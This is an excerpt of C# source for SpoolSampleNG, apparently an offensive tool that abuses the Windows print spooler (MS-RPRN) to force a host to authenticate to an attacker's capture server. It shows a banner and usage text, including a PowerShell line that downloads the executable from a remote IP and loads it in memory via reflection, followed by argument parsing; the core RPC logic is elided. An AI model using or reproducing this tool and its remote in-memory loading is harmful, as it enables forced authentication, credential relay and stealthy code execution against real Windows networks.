...
namespace SpoolSampleNG
{
    ...
    {
        // Reference: https://github.com/vletoux/pingcastle/blob/7b63f846076baa96147df04b135dd31eef8f5fac/RPC/spool.cs
...
/ ___| _ __   ___   ___ | / ___|  __ _ _ __ ___  _ __ | | ___| \ | |/ ___|
\___ \| '_ \ / _ \ / _ \| \___ \ / _` | '_ ` _ \| '_ \| |/ _ \  \| | |  _ 
 ___) | |_) | (_) | (_) | |___) | (_| | | | | | | |_) | |  __/ |\  | |_| |
|____/| .__/ \___/ \___/|_|____/ \__,_|_| |_| |_| .__/|_|\___|_| \_|\____|
      |_|                                       |_|                   
...
[+]  Force Authentication : ./SpoolSampleNG.exe \\<source> \\<destination>

.---------------------------------------.
| Usage from Memory via .NET Reflection |
'---------------------------------------'

[+]  Load Locally         : [System.Reflection.Assembly]::LoadFile(""$PWD/SpoolSampleNG.exe"")
[+]  Load Remotely        : [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http(s)://<ip_addr>/SpoolSampleNG.exe'))
---
[+]  Force Authentication : [SpoolSampleNG.Program]::Main(@('\\<source>','\\destination'))
";
            ...
            {
                Console.WriteLine("[-] No arguments detected.  Use '--help' for usage information.\n");
                return;
            }
            else if (args.Length > 2)
            {
                Console.WriteLine("[-] Too many arguments detected.  Use '--help' for usage information.\n");
                return;
            }
            // Return help message
            else if (args[0] == "--help")
            ...
            string printerHost = "\\\\" + args[0];
            string captureServer = "\\\\" + args[1];


            // MS-RPRN Documentation: https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-RPRN/%5bMS-RPRN%5d.pdf
